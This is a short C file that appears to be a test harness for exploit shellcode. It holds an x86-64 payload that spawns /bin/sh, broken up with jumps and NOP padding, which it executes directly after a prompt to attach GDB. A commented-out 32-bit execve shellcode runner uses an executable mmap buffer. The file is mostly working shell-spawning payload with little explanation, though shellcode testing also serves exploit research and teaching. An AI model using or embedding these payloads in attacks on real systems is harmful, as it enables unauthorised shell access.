#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

// Add Jump and nop
const uint8_t sc[] = "\x48\x31\xD2\x52\x68\x2F\x62\x69\x6E\xEB\x05\x90\x90\x90\x90\x90\xC7\x44\x24\x04\x2F\x2F\x73\x68\xEB\x06\x90\x90\x90\x90\x90\x90\x58\x50\x48\x89\xE7\x52\x57\xEB\x07\x90\x90\x90\x90\x90\x90\x90\x48\x89\xE6\x48\x31\xC0\xB0\x3B\xEB\x06\x90\x90\x90\x90\x90\x90\x0F\x05";

int main (void)
{
  // system("pidof -s raj-srv > /tmp/pid-of-raj-srv");
  system("read -p 'Attach GDB' var");
  ((void (*) (void)) sc) ();
  return EXIT_SUCCESS;
}

// #include <stdio.h>
// #include <string.h>
// #include <sys/mman.h>

// void run_x64(){
//   char code[] = {0x31, 0xC0, 0x50, 0x68, 0x2F, 0x2F, 0x73, 0x68, 0x68, 0x2F, 0x62, 0x69, 0x6E, 0x89, 0xE3, 0x50, 0x89, 0xE2, 0x53, 0x89, 0xE1, 0xB0, 0x0B, 0xCD, 0x80};

//   int (*sum) (int, int) = NULL;

//   // allocate executable buffer                                             
//   sum = mmap (0, sizeof(code), PROT_READ|PROT_WRITE|PROT_EXEC,
//               MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

//   // copy code to buffer
//   memcpy (sum, code, sizeof(code));
//   // doesn't actually flush cache on x86, but ensure memcpy isn't
//   // optimized away as a dead store.
//   __builtin___clear_cache (sum, sum + sizeof(sum));  // GNU C

//   // run code
//   int a = 2;
//   int b = 3;
//   int c = sum (a, b);

//   printf ("%d + %d = %d\n", a, b, c);
// }
